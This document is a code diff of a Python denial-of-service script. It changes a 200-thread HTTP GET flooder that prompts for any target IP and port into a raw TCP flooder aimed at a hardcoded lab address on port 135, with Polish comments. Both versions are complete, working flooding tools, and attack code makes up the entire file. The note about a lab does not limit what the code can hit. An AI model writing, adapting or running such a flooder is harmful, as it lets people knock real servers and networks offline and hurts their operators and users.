@@ -1,52 +1,39 @@
 import socket
 import threading
-import random
 import time
-import os
+import random
+import string
 
-TARGET_IP = input("TARGET IP: ")
-TARGET_PORT = int(input("OPEN PORT: "))
-os.system("clear")
-print("MADE BY apexvr_ ON TIKTOK")
+TARGET_IP = '192.168.1.166'   # Zamień na IP serwera/routera w Twoim labie
+TARGET_PORT = 135         # Port TCP do floodowania
 NUM_THREADS = 200
 
-def random_http_request():
-    paths = ["/", "/index.html", "/about", "/contact", "/login"]
-    user_agents = [
-        "Mozilla/5.0",
-        "Chrome/90.0",
-        "Safari/537.36",
-        "Opera/9.80",
-        "Edge/18.18363"
-    ]
-    path = random.choice(paths)
-    agent = random.choice(user_agents)
-    request = f"GET {path} HTTP/1.1\r\nHost: {TARGET_IP}\r\nUser-Agent: {agent}\r\nConnection: keep-alive\r\n\r\n"
-    return request.encode()
+def random_payload(size=1024):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
 
-def flood():
+def tcp_flood():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             s.connect((TARGET_IP, TARGET_PORT))
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # wysyłaj od razu
             while True:
-                s.sendall(random_http_request())
+                s.sendall(random_payload(1024))  # surowe dane TCP
         except Exception:
             s.close()
-            time.sleep(0.1)
+            time.sleep(0.05)  # króciutki odpoczynek przed kolejną próbą
 
 threads = []
 for i in range(NUM_THREADS):
-    t = threading.Thread(target=flood, name=f"Wątek-{i+1}", daemon=True)
+    t = threading.Thread(target=tcp_flood, name=f"Wątek-{i+1}", daemon=True)
     t.start()
     threads.append(t)
 
-print(f"Flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.")
+print(f"🚀 TCP flood uruchomiony na {TARGET_IP}:{TARGET_PORT} z {NUM_THREADS} wątkami. Przerwij Ctrl+C.")
 
 try:
     while True:
         time.sleep(1)
 except KeyboardInterrupt:
-    print("\nFlood ended (Ctrl+C)")
+    print("\n✅ Flood zakończony (Ctrl+C)")
